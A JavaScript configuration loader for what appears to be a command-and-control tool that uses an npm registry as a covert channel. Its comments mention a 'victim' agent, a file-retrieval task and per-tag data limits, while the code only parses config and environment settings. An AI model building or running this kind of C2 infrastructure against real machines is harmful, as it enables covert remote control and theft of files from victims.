// Configuration loader: defaults < config file < environment overrides.
//
// Before anything else is read, an optional `env.sh` file (KEY=VALUE or
// `export KEY=VALUE` lines) is loaded into process.env. This is the
// supported way to keep NPM_C2_TOKEN out of your shell history while still
// supplying it "via the environment". env.sh must be git-ignored — it
// contains a secret. Real environment variables always win over env.sh.
import fs from 'node:fs';
import path from 'node:path';

export const DEFAULTS = {
  registryUrl: 'http://localhost:4873',
  packageName: 'my-package',
  pollIntervalSec: 10,
  agentId: '', // optional; generated and persisted by the victim if absent
  logFile: '', // '' disables file logging
  stateFile: '', // role-specific default is used when empty
  maxFileBytes: 32 * 1024, // cap for the getfile task (channel moves ~130B/tag)
  token: '', // only ever populated from the NPM_C2_TOKEN env var
};

export function channelTimings(pollIntervalSec) {
  const heartbeatMs = Math.max(30_000, Number(pollIntervalSec) * 1_000);
  return {
    heartbeatMs,
    offlineMs: heartbeatMs * 3,
    taskTtlMs: heartbeatMs * 4,
  };
}

const ENV_KEY_RE = /^[A-Za-z_][A-Za-z0-9_]*$/;

/**
 * Load KEY=VALUE lines from an env.sh-style file into process.env.
 * Looks at $NPM_C2_ENV_FILE first, then ./env.sh. Missing file is fine.
 * Lines already present in the real environment are NOT overridden.
 * Supports: blank lines, # comments, optional `export ` prefix,
 * optional single/double quotes around values.
 * @returns {string|null} path that was loaded, or null
 */
export function loadEnvFile(envPath) {
  const file = envPath
    ? path.resolve(envPath)
    : process.env.NPM_C2_ENV_FILE
      ? path.resolve(process.env.NPM_C2_ENV_FILE)
      : path.resolve('env.sh');
  if (!fs.existsSync(file)) return null;
  if (process.platform !== 'win32' && (fs.statSync(file).mode & 0o077) !== 0) {
    throw new Error(`env file must be private; run: chmod 600 "${file}"`);
  }

  const lines = fs.readFileSync(file, 'utf8').split(/\r?\n/);
  for (const raw of lines) {
    const line = raw.trim();
    if (line === '' || line.startsWith('#')) continue;
    const body = line.startsWith('export ') ? line.slice('export '.length).trimStart() : line;
    const eq = body.indexOf('=');
    if (eq < 1) continue;
    const key = body.slice(0, eq).trim();
    if (!ENV_KEY_RE.test(key)) continue;
    let value = body.slice(eq + 1).trim();
    if (
      value.length >= 2 &&
      ((value.startsWith('"') && value.endsWith('"')) || (value.startsWith("'") && value.endsWith("'")))
    ) {
      value = value.slice(1, -1);
    }
    if (process.env[key] === undefined) {
      process.env[key] = value;
    }
  }
  return file;
}

/**
 * Resolve which config file to use.
 * Priority: explicit argument > $NPM_C2_CONFIG > ./config.json
 */
export function resolveConfigPath(explicitPath) {
  if (explicitPath) return path.resolve(explicitPath);
  if (process.env.NPM_C2_CONFIG) return path.resolve(process.env.NPM_C2_CONFIG);
  return path.resolve('config.json');
}

/**
 * Load configuration.
 * @param {string} [explicitPath] path to a JSON config file (may not exist)
 * @returns {object} merged, validated config
 */
export function loadConfig(explicitPath) {
  loadEnvFile(); // populate process.env from env.sh first (real env still wins)
  const cfg = { ...DEFAULTS };

  const filePath = resolveConfigPath(explicitPath);
  if (fs.existsSync(filePath)) {
    const raw = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    if (raw && typeof raw === 'object') {
      for (const key of Object.keys(DEFAULTS)) {
        if (raw[key] !== undefined && key !== 'token') cfg[key] = raw[key];
      }
    }
  }

  // Environment overrides
  if (process.env.NPM_C2_REGISTRY_URL) cfg.registryUrl = process.env.NPM_C2_REGISTRY_URL;
  if (process.env.NPM_C2_PACKAGE_NAME) cfg.packageName = process.env.NPM_C2_PACKAGE_NAME;
  if (process.env.NPM_C2_POLL_INTERVAL) {
    const n = Number(process.env.NPM_C2_POLL_INTERVAL);
    if (Number.isFinite(n) && n > 0) cfg.pollIntervalSec = n;
  }
  if (process.env.NPM_C2_AGENT_ID) cfg.agentId = process.env.NPM_C2_AGENT_ID;
  if (process.env.NPM_C2_LOG_FILE !== undefined && process.env.NPM_C2_LOG_FILE !== '') {
    cfg.logFile = process.env.NPM_C2_LOG_FILE;
  }
  if (process.env.NPM_C2_STATE_FILE) cfg.stateFile = process.env.NPM_C2_STATE_FILE;
  if (process.env.NPM_C2_MAX_FILE_BYTES) {
    const n = Number(process.env.NPM_C2_MAX_FILE_BYTES);
    if (Number.isFinite(n) && n > 0) cfg.maxFileBytes = Math.floor(n);
  }

  // The auth token is ONLY ever read from the environment — never from a file.
  cfg.token = process.env.NPM_C2_TOKEN || '';

  // Validation
  let parsed;
  try {
    parsed = new URL(cfg.registryUrl);
  } catch {
    throw new Error(`invalid registryUrl: "${cfg.registryUrl}"`);
  }
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
    throw new Error(`registryUrl must be http(s): "${cfg.registryUrl}"`);
  }
  cfg.registryUrl = cfg.registryUrl.replace(/\/+$/, '');
  if (!cfg.packageName || typeof cfg.packageName !== 'string') {
    throw new Error('packageName must be a non-empty string');
  }
  cfg.pollIntervalSec = Number(cfg.pollIntervalSec);
  if (!Number.isFinite(cfg.pollIntervalSec) || cfg.pollIntervalSec <= 0) {
    throw new Error(`pollIntervalSec must be a positive number, got ${cfg.pollIntervalSec}`);
  }
  if (!Number.isFinite(Number(cfg.maxFileBytes)) || Number(cfg.maxFileBytes) <= 0) {
    throw new Error(`maxFileBytes must be a positive number, got ${cfg.maxFileBytes}`);
  }
  cfg.maxFileBytes = Math.floor(Number(cfg.maxFileBytes));

  return cfg;
}

/** Parse `--config <path>` (or `--config=<path>`) from argv. */
export function configArgFromArgv(argv = process.argv.slice(2)) {
  for (let i = 0; i < argv.length; i++) {
    if (argv[i] === '--config' && argv[i + 1]) return argv[i + 1];
    if (argv[i].startsWith('--config=')) return argv[i].slice('--config='.length);
  }
  return undefined;
}
